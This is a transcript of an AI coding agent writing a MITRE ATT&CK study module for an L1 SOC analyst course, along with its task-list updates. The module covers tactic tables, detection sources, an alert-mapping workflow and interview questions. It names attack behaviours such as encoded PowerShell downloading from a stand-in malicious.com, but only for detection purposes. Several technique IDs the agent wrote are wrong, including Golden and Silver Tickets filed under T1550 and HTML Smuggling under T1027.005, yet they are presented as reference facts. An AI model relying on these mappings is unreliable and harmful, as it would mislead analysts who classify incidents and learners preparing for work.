      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 207.2s)

_Thinking:_

Now let me create Module 18 - MITRE ATT&CK.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 18: MITRE ATT&CK\n\n**Priority: P0 — Universal language for threat behavior. L1 maps every alert to ATT&CK.**\n\n---\n\n## 18.1 What is MITRE ATT&CK?\n\n**Adversarial Tactics, Techniques, and Common Knowledge** — Globally accessible knowledge base of adversary tactics and techniques based on real-world observations.\n\n### Core Philosophy\n- **Tactics** = *Why* (Goal)\n- **Techniques** = *How* (Method)\n- **Procedures** = *Specific implementation* (Tool/Code)\n- **Sub-techniques** = *Granular variants* (.001, .002, etc.)\n\n### Matrices\n| Matrix | Scope | Platforms |\n|--------|-------|-----------|\n| **Enterprise** | Traditional IT networks | Windows, macOS, Linux, Azure AD, Office 365, Google Workspace, SaaS, IaaS, Network, Containers |\n| **Mobile** | Mobile devices | iOS, Android |\n| **ICS** | Industrial Control Systems | PLC, RTU, HMI, SCADA, Historian |\n| **PRE-ATT&CK** (Deprecated) | Pre-compromise | Recon, Resource Development |\n\n**L1 Focus**: **Enterprise Matrix** (Windows, Linux, Azure AD, Office 365, Network).\n\n---\n\n## 18.2 Enterprise Tactics (14) — In Attack Order\n\n| # | Tactic | ID | Goal | Example Techniques |\n|---|--------|----|------|-------------------|\n| 1 | **Reconnaissance** | TA0043 | Gather target info | T1590 (Active Scanning), T1598 (Phishing for Info) |\n| 2 | **Resource Development** | TA0042 | Build/acquire capabilities | T1583 (Acquire Infrastructure), T1587 (Develop Capabilities) |\n| 3 | **Initial Access** | TA0001 | Get into network | T1566 (Phishing), T1190 (Exploit Public App), T1078 (Valid Accounts) |\n| 4 | **Execution** | TA0002 | Run malicious code | T1059 (Command/Scripting), T1204 (User Execution), T1106 (Native API) |\n| 5 | **Persistence** | TA0003 | Maintain foothold | T1547 (Boot/Logon), T1053 (Scheduled Task), T1543 (Service) |\n| 6 | **Privilege Escalation** | TA0004 | Gain higher permissions | T1068 (Exploit), T1134 (Token Manipulation), T1548 (Bypass UAC) |\n| 7 | **Defense Evasion** | TA0005 | Avoid detection | T1055 (Process Injection), T1036 (Masquerading), T1562 (Disable Tools) |\n| 8 | **Credential Access** | TA0006 | Steal credentials | T1003 (OS Credential Dumping), T1558 (Kerberos), T1550 (Use Alt Auth) |\n| 9 | **Discovery** | TA0007 | Learn environment | T1082 (System Info), T1083 (File/Dir), T1018 (Remote System) |\n| 10 | **Lateral Movement** | TA0008 | Move through network | T1021 (Remote Services), T1550 (Alt Auth), T1080 (Taint Shared) |\n| 11 | **Collection** | TA0009 | Gather data of interest | T1005 (Local System), T1039 (Network Shares), T1114 (Email) |\n| 12 | **Command & Control** | TA0011 | Communicate with controlled systems | T1071 (App Layer Protocol), T1090 (Proxy), T1573 (Encrypted Channel) |\n| 13 | **Exfiltration** | TA0010 | Steal data | T1567 (Web Service), T1041 (C2 Channel), T1048 (Alt Protocol) |\n| 14 | **Impact** | TA0040 | Manipulate/destroy | T1486 (Data Encrypted), T1485 (Data Destruction), T1529 (Shutdown) |\n\n---\n\n## 18.3 Critical Techniques for L1 — Must Know Cold\n\n### Initial Access (TA0001)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Phishing** | T1566 | .001 Spearphishing Attachment, .002 Spearphishing Link, .003 Spearphishing via Service | Email gateway, User report, Sandbox, EDR (Office→Script) |\n| **Exploit Public-Facing App** | T1190 | — | WAF, NDA, App logs, Vuln scan correlation |\n| **Valid Accounts** | T1078 | .001 Default, .002 Domain, .003 Local, .004 Cloud | Auth logs (impossible travel, MFA bypass, new device) |\n| **External Remote Services** | T1133 | VPN, Citrix, RDP Gateway | VPN logs, MFA logs, Geo/IP reputation |\n| **Drive-by Compromise** | T1189 | — | Proxy, EDR (browser exploit), Threat intel |\n| **Supply Chain** | T1195 | .001 Compromise Software, .002 Compromise Hardware | Hash verification, Vendor advisory, SBOM |\n| **Trusted Relationship** | T1199 | — | Third-party access logs, Contract review |\n\n### Execution (TA0002)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Command & Scripting Interpreter** | T1059 | .001 PowerShell, .002 AppleScript, .003 Windows CMD, .004 Unix Shell, .005 Visual Basic, .006 Python, .007 JavaScript/JScript | **EDR (process tree), 4688, Sysmon EID 1, 4104 (PS), AMSI** |\n| **User Execution** | T1204 | .001 Malicious Link, .002 Malicious File | Email gateway, Proxy, EDR, User report |\n| **Scheduled Task/Job** | T1053 | .005 Scheduled Task, .003 Cron, .006 Systemd Timer | 4698, Sysmon EID 1/4/5, cron logs |\n| **Native API** | T1106 | — | EDR (API monitoring), ETW |\n| **Inter-Process Communication** | T1559 | .001 DCOM, .002 Port Monitors | Sysmon EID 8/10, EDR |\n| **System Services** | T1569 | .001 Launchctl, .002 Systemd | Service logs, EDR |\n\n### Persistence (TA0003) — **High-Value Detections**\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Boot/Logon Autostart** | T1547 | .001 Registry Run Keys, .002 Startup Folder, .003 Shortcut Modification, .004 Winlogon, .005 Services, .006 Kernel Modules | Sysmon EID 11/12/13, 4657, 7045, EDR |\n| **Scheduled Task/Job** | T1053 | .005 Scheduled Task, .003 Cron | 4698, Sysmon EID 1, cron |\n| **Create/Modify System Process** | T1543 | .003 Windows Service, .002 Systemd | 7045, Sysmon EID 4, systemd |\n| **Event Triggered Execution** | T1546 | .003 WMI, .007 .NET Profiler, .008 Accessibility, .011 AppInit, .012 Image Hijack, .015 Component Firmware | Sysmon EID 19/20/21, 4657, EDR |\n| **Hijack Execution Flow** | T1574 | .001 DLL Search Order, .002 DLL Side-Loading, .004 Dylib Hijacking | Sysmon EID 7/11, EDR |\n| **Account Manipulation** | T1098 | .001 Additional Cloud Credentials, .003 Additional Email Delegates | AD/Entra ID audit logs |\n\n### Privilege Escalation (TA0004)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Exploitation for Privilege Escalation** | T1068 | — | EDR (exploit behavior), Patch status |\n| **Access Token Manipulation** | T1134 | .001 Token Impersonation, .002 Create Process with Token, .003 Make/Impersonate Token, .004 Parent PID Spoofing | Sysmon EID 8/10, EDR (token APIs), 4672 |\n| **Abuse Elevation Control** | T1548 | .002 Bypass UAC, .003 Sudo, .004 Elevated Execution with Prompt | Sysmon EID 1 (High IL from Medium), EDR |\n\n### Defense Evasion (TA0005) — **Critical for EDR**\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Process Injection** | T1055 | .001 Dynamic-link Library, .002 Portable Executable, .003 Thread Execution, .004 Asynchronous Procedure Call, .005 Thread Local Storage, .008 Process Hollowing, .009 Process Doppelgänging, .011 Process Herpaderping, .012 Process Ghosting | **Sysmon EID 8/10/25, EDR (memory APIs, RWX)** |\n| **Masquerading** | T1036 | .001 Invalid Code Signature, .002 Right-to-Left Override, .003 Rename System Utilities, .004 Masquerade Task/Service, .005 Match Legitimate Name/Location | Sysmon EID 1 (OriginalFileName), EDR |\n| **Disable/Modify Tools** | T1562 | .001 Disable Security Tools, .002 Disable Windows Event Logging, .003 Impair Defenses, .004 Disable Syslog, .007 Modify Registry | 1102, 4719, 4657, Sysmon EID 12/13, EDR (tamper alerts) |\n| **Indicator Removal** | T1070 | .001 Clear Windows Event Logs, .002 Clear Linux Logs, .004 File Deletion, .006 Timestomp | 1102, Sysmon EID 2/23, EDR |\n| **Obfuscated/Stored Files** | T1027 | .001 Binary Padding, .002 Software Packing, .003 Steganography, .004 Compile After Delivery, .005 HTML Smuggling | Static analysis (entropy, packer), EDR |\n| **Subvert Trust Controls** | T1553 | .001 Code Signing, .002 SIP/Trust Provider, .003 Install Root Cert, .004 Code Signing Policy | Cert logs, EDR |\n\n### Credential Access (TA0006) — **Crown Jewels**\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **OS Credential Dumping** | T1003 | .001 LSASS Memory, .002 SAM, .003 NTDS, .004 LSA Secrets, .005 Cached Creds, .006 DCSync, .008 /etc/passwd & /etc/shadow | **Sysmon EID 10 (LSASS), EDR, 4624/4672, NTDS.dit access** |\n| **Kerberoasting** | T1558 | .003 Kerberoasting | 4769 (RC4), EDR, BloodHound |\n| **AS-REP Roasting** | T1558 | .004 AS-REP Roasting | 4768 (no pre-auth), 4771 |\n| **Pass the Hash** | T1550 | .002 Pass the Hash | 4624 Type 3/9, 4776, NDR (SMB) |\n| **Pass the Ticket** | T1550 | .003 Pass the Ticket | 4624 Type 9, Kirbi files, EDR |\n| **Golden/Silver Ticket** | T1550 | .001 Golden Ticket, .002 Silver Ticket | 4768/4769 anomalies, krbtgt age |\n| **Unsecured Credentials** | T1552 | .001 Credentials in Files, .002 Registry, .003 Bash History, .004 Private Keys | EDR (file/reg access), Git secrets |\n\n### Discovery (TA0007)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **System Information Discovery** | T1082 | — | EDR (systeminfo, whoami, hostname) |\n| **File and Directory Discovery** | T1083 | — | EDR (dir, ls, Get-ChildItem) |\n| **System Network Configuration** | T1016 | .001 Internet Connection Discovery | EDR (ipconfig, ifconfig, netsh) |\n| **Remote System Discovery** | T1018 | — | EDR (net view, nmap, AD Find) |\n| **Account Discovery** | T1087 | .001 Domain Account, .002 Local Account, .003 Email Account, .004 Cloud Account | EDR (net user, Get-ADUser, Graph API) |\n| **Permission Groups Discovery** | T1069 | .001 Local Groups, .002 Domain Groups, .003 Cloud Groups | EDR (net localgroup, Get-ADGroupMember) |\n| **Network Share Discovery** | T1135 | — | EDR (net share, SMB enumeration) |\n\n### Lateral Movement (TA0008)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Remote Services** | T1021 | .001 RDP, .002 SMB/Windows Admin Shares, .003 Distributed Component Object Model, .004 SSH, .005 VNC, .006 WinRM | 4624 Type 10/3, Sysmon EID 3, NDR (SMB/RDP/RPC/WinRM) |\n| **Lateral Tool Transfer** | T1570 | — | Sysmon EID 11 (copy), NDR (SMB write), EDR |\n| **Use Alternate Authentication Material** | T1550 | .001 Pass the Hash, .002 Pass the Ticket, .003 Web Session Cookie | As above |\n\n### Collection (TA0009)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Data from Local System** | T1005 | — | EDR (file reads, staging) |\n| **Data from Network Shares** | T1039 | — | NDR (SMB read), File audit (4663) |\n| **Data from Information Repositories** | T1213 | .001 Confluence, .002 SharePoint | Cloud logs, EDR |\n| **Email Collection** | T1114 | .001 Local Email Collection, .002 Remote Email Collection | EDR (MAPI, OWA, Graph API), Mailbox audit |\n| **Archive Collected Data** | T1560 | .001 Archive via Utility, .002 Archive via Library | EDR (7z, rar, tar, zip, Compress-Archive) |\n\n### Command & Control (TA0011)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Application Layer Protocol** | T1071 | .001 Web Protocols, .002 File Transfer, .003 Mail, .004 DNS, .005 SMB/Windows Admin Shares | Proxy, DNS logs, NDR, EDR netconns |\n| **Proxy** | T1090 | .001 Internal, .002 External, .003 Multi-hop, .004 Domain Fronting | NDR, Proxy logs |\n| **Encrypted Channel** | T1573 | .001 Symmetric, .002 Asymmetric | JA3/JA3S, TLS cert analysis |\n| **Ingress Tool Transfer** | T1105 | — | EDR (download), Proxy, Sysmon EID 3/11 |\n| **Dynamic Resolution** | T1568 | .001 Fast Flux, .002 Domain Generation Algorithms, .003 DNS Calculation | DNS logs, NDR |\n\n### Exfiltration (TA0010)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Exfiltration Over Web Service** | T1567 | .001 Exfil to Code Repository, .002 Exfil to Cloud Storage | Proxy, Cloud logs, DLP |\n| **Exfiltration Over C2 Channel** | T1041 | — | NDR, EDR netconns |\n| **Exfiltration Over Alternative Protocol** | T1048 | .001 Exfil over DNS, .002 Exfil over SMB | DNS logs, NDR |\n\n### Impact (TA0040)\n| Technique | ID | Sub-techniques | Detection |\n|-----------|----|----------------|-----------|\n| **Data Encrypted for Impact** | T1486 | — | EDR (mass file modify, entropy, ransom notes) |\n| **Data Destruction** | T1485 | — | EDR (mass delete, wiper) |\n| **Inhibit System Recovery** | T1490 | .001 Disable Backup, .002 Delete Shadow Copies | EDR (vssadmin, wbadmin, bcdedit) |\n| **Service Stop** | T1489 | — | EDR (net stop, sc stop) |\n| **System Shutdown/Reboot** | T1529 | — | EDR (shutdown, reboot) |\n\n---\n\n## 18.4 MITRE Mapping Workflow for L1\n\n```\nALERT TRIAGED AS TRUE POSITIVE\n            │\n            ▼\n┌─────────────────────────────────────────┐\n│  IDENTIFY OBSERVED BEHAVIORS            │\n│  - Process tree: WINWORD → POWERSHELL   │\n│  - Command: -enc DownloadString         │\n│  - Network: HTTP to malicious.com       │\n│  - File: %TEMP%\\payload.exe created     │\n│  - Persistence: Run key added           │\n└─────────────────────┬───────────────────┘\n                      ▼\n┌─────────────────────────────────────────┐\n│  MAP TO TECHNIQUES (Use ATT&CK Navigator)│\n│  - T1566.001 (Phishing Attachment)      │\n│  - T1059.001 (PowerShell)               │\n│  - T1105 (Ingress Tool Transfer)        │\n│  - T1071.001 (HTTP C2)                  │\n│  - T1547.001 (Registry Run Key)         │\n└─────────────────────┬───────────────────┘\n                      ▼\n┌─────────────────────────────────────────┐\n│  MAP TO TACTICS                         │\n│  - Initial Access (TA0001)              │\n│  - Execution (TA0002)                   │\n│  - Persistence (TA0003)                 │\n│  - Command & Control (TA0011)           │\n└─────────────────────┬───────────────────┘\n                      ▼\n┌─────────────────────────────────────────┐\n│  DOCUMENT IN CASE                       │\n│  - Technique IDs + Names                │\n│  - Evidence per technique               │\n│  - Confidence (Observed/Inferred)       │\n│  - MITRE ATT&CK Navigator Layer URL     │\n└─────────────────────────────────────────┘\n```\n\n---\n\n## 18.5 ATT&CK Navigator — Visualization\n\n### Creating a Layer\n1. Go to https://attack.mitre.org/ (or internal instance)\n2. Select **Enterprise** matrix\n3. Click **Create Layer** → **New Layer**\n4. **Search/Select** techniques from your investigation\n5. **Color-code**:\n   - **Red** = Observed (direct evidence)\n   - **Orange** = Inferred (strong indicator)\n   - **Yellow** = Possible (weak indicator)\n   - **Green** = Not observed (coverage gap)\n6. **Add Metadata**: Case ID, Analyst, Date, Confidence\n7. **Export** → JSON (for case attachment) / SVG (for report)\n\n### Example Layer for Phishing → C2\n```json\n{\n  \"name\": \"INC-2024-001234 - Phishing to C2\",\n  \"domain\": \"enterprise-attack\",\n  \"techniques\": [\n    {\"techniqueID\": \"T1566.001\", \"score\": 100, \"comment\": \"Malicious .docm delivered via email\"},\n    {\"techniqueID\": \"T1059.001\", \"score\": 100, \"comment\": \"PowerShell -enc DownloadString\"},\n    {\"techniqueID\": \"T1105\", \"score\": 100, \"comment\": \"Payload downloaded from malicious.com\"},\n    {\"techniqueID\": \"T1071.001\", \"score\": 100, \"comment\": \"HTTP C2 beaconing\"},\n    {\"techniqueID\": \"T1547.001\", \"score\": 80, \"comment\": \"Run key persistence (inferred)\"}\n  ],\n  \"gradient\": {\"colors\": [\"#ff6666\",\"#ffcc66\",\"#ffff66\",\"#66ff66\"], \"minValue\": 0, \"maxValue\": 100}\n}\n```\n\n---\n\n## 18.6 Detection Coverage & Gap Analysis\n\n### Coverage Mapping\n| Tactic | Techniques | Covered (EDR/SIEM/NDR) | Gaps |\n|--------|------------|------------------------|------|\n| **Initial Access** | 9 | Phishing (EDR/Email), Valid Accts (Auth) | Supply Chain, Drive-by |\n| **Execution** | 12 | PS/CMD (EDR/4104), Scheduled Task (4698) | Native API, IPC |\n| **Persistence** | 19 | Run Keys (Sysmon), Tasks (4698), Services (7045) | WMI, COM, Bootkit |\n| **Priv Esc** | 13 | Token Manip (EDR), UAC Bypass (EDR) | Kernel Exploit |\n| **Defense Evasion** | 42 | Process Inj (EDR/Sysmon), Masquerade (Sysmon), Log Clear (1102) | Unhooking, Certs |\n| **Cred Access** | 16 | LSASS (EDR/Sysmon), Kerberoast (4769), PtH (Auth) | DCSync, Keys |\n| **Discovery** | 30 | System/Network/Account (EDR) | Cloud, Container |\n| **Lateral** | 9 | SMB/RDP/WinRM (NDR/Auth) | DCOM, SSH Keys |\n| **Collection** | 17 | Local/Shares/Email (EDR/NDR) | Cloud Repos |\n| **C2** | 16 | HTTP/DNS (Proxy/NDR/EDR), Proxy | Domain Fronting |\n| **Exfil** | 9 | Web/Cloud/C2 (Proxy/NDR/DLP) | Physical, Alt Proto |\n| **Impact** | 13 | Ransomware (EDR), Wiper (EDR) | Firmware |\n\n**L1 Task**: Know your org's coverage. Flag gaps in escalation.\n\n---\n\n## 18.7 Interview Questions for This Module\n\n1. **What are the 14 Enterprise ATT&CK Tactics in order?**\n   - Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command & Control, Exfiltration, Impact.\n\n2. **Explain the difference between Tactic, Technique, Sub-technique, and Procedure.**\n   - Tactic: Goal (Why). Technique: Method (How). Sub-technique: Granular variant (.001). Procedure: Specific implementation (Tool/Code).\n\n3. **What are the top 5 techniques L1 analysts should know for Initial Access?**\n   - T1566 (Phishing), T1190 (Exploit Public App), T1078 (Valid Accounts), T1133 (External Remote Services), T1189 (Drive-by).\n\n4. **How do you map an alert to MITRE ATT&CK?**\n   - Identify observed behaviors → Map each to Technique ID → Group by Tactic → Document evidence + confidence → Create Navigator layer.\n\n5. **What is the difference between \"Observed\" and \"Inferred\" in ATT&CK mapping?**\n   - Observed: Direct evidence (logs show PowerShell -enc). Inferred: Strong indicator but not directly logged (persistence likely but not seen).\n\n6. **What is ATT&CK Navigator and how do you use it?**\n   - Web tool to visualize coverage/mapping. Create layer → Select techniques → Color-code (Observed/Inferred/Possible) → Add metadata → Export JSON/SVG.\n\n7. **Name 5 Defense Evasion techniques with high detection value.**\n   - T1055 (Process Injection), T1036 (Masquerading), T1562.001 (Disable Security Tools), T1070.001 (Clear Logs), T1027 (Obfuscation/Packing).\n\n8. **What is the Credential Access tactic and its crown jewel technique?**\n   - Stealing credentials. Crown jewel: T1003.001 (LSASS Memory Dumping) — leads to lateral movement, privilege escalation.\n\n9. **How does ATT&CK help with detection gap analysis?**\n   - Map existing detections to Techniques → Identify uncovered Techniques per Tactic → Prioritize gap closure by risk/prevalence.\n\n10. **What are the four ATT&CK Matrices and which is primary for L1?**\n    - Enterprise (Windows, Linux, Cloud, SaaS, Network), Mobile (iOS/Android), ICS (OT), PRE (deprecated). **Enterprise** is primary for L1.\n\n---\n\n## 18.8 Study Checklist for Module 18\n\n- [ ] Recite 14 Enterprise Tactics in order with IDs\n- [ ] Explain Tactic vs Technique vs Sub-technique vs Procedure\n- [ ] List top 5 techniques for each tactic (Initial Access through Impact)\n- [ ] Map sample alert to MITRE (behaviors → techniques → tactics)\n- [ ] Create ATT&CK Navigator layer (JSON export)\n- [ ] Perform detection coverage gap analysis for your org\n- [ ] Identify \"Crown Jewel\" techniques per tactic (LSASS, Process Injection, etc.)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 19 — Common Attacks*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/18-mitre-attck.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 32.7s)

_Thinking:_

Good, Module 18 is done. Now let me continue with Module 19 - Common Attacks.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
